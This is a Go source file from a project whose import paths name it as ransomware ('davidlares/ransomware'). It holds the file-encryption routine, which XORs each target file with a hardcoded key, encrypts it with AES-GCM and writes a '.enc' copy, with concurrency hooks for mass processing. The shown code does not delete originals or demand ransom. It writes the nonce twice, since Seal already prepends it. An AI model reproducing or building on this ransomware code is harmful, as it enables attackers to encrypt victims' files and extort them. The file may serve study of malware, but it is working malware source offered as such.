package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"davidlares/ransomware/encrypt/xor"
	"davidlares/ransomware/mapper"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)

const xorKey = "mysecretkey"

func EncryptWithXorAndAES(id int, filename, keyFile string, encryptControl chan struct{}) error {
	// defer channel
	defer func() { <-encryptControl }()
	// then
	defer mapper.Wg.Done()
	// file
	inFile, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("Error reading file %w", err)
	}
	// Read the key from the key file
	key, err := ioutil.ReadFile(keyFile)
	if err != nil {
		return fmt.Errorf("Error reading key file %w", err)
	}
	// good
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		return fmt.Errorf("Invalid key length: %d bytes. Key must be 16, 24, or 32 bytes long", len(key))
	}
	// masked data (calling the file)
	maskedData := xor.XorBytes(inFile, []byte(xorKey))
	// generating the block
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("Error creating AES cipher: %w", err)
	}
	// GCM mode
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("Error creating GCM mode: %w", err)
	}
	// nonce (random and unique per file)
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("Error generating nonce: %w", err)
	}
	// cipher text
	ciphertext := aesGCM.Seal(nonce, nonce, maskedData, nil)
	// out file => this is the converted file
	outFile, err := os.Create(filename + ".enc")
	if err != nil {
		return fmt.Errorf("Error creating output file: %w", err)
	}
	// close the file when done
	defer outFile.Close()
	// write cipher text
	_, err = outFile.Write(nonce)
	if err != nil {
		return fmt.Errorf("Error writing nonce to output file: %w", err)
	}
	// write cipher text
	_, err = outFile.Write(ciphertext)
	if err != nil {
		return fmt.Errorf("Error writing ciphertext to output file: %w", err)
	}
	return nil
}
